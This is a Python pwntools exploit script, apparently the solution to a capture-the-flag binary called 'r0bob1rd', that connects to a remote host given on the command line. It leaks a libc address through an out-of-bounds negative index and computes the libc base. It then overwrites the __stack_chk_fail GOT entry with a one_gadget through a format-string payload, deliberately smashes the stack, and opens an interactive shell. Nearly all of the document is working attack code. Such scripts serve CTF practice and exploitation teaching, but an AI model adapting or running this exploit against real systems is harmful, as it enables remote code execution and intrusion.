from pwn import *
import sys

### Setup ###

file_name = './r0bob1rd' #Filename
elf = context.binary = ELF(file_name, checksec=True)

lib = 'glibc/libc.so.6' #Library to use
libc = context.binary = ELF(lib, checksec=False)

ip = sys.argv[1]
port = sys.argv[2]

######################################################################################
# Sending payload of -8, sum of "p/x (0x6020a0 - 0x602060) / sizeof(long)" = 0x8     #
# 0x6020a0 = robobirdNames Address                                                   #
# 0x602060 = Address of setvbuf from GDB                                             #
######################################################################################

bin = remote(ip,port)
bin.sendlineafter(b'>', b'-8')

### Leak ###
bin.recvuntil(b'sen: ')
leak = unpack(bin.recv(6) + b'\x00' * 2)
log.info('Leak: {}'.format(hex(leak)))

### Libc Base Address ###

libc.address = leak - libc.sym['setvbuf']
log.info('Libc Address: {}'.format(hex(libc.address)))

### Overwrite __stack_chk_fail ###
gadget = 0xe3b01
one_gadget = libc.address + gadget
log.info('one_gadget: {}'.format(hex(one_gadget)))

fmt = fmtstr_payload(8, {elf.got["__stack_chk_fail"]:one_gadget}, write_size="short")

payload = b''
payload += fmt
payload += b'\x90' * 106

bin.sendlineafter(b'>', payload)
bin.interactive()
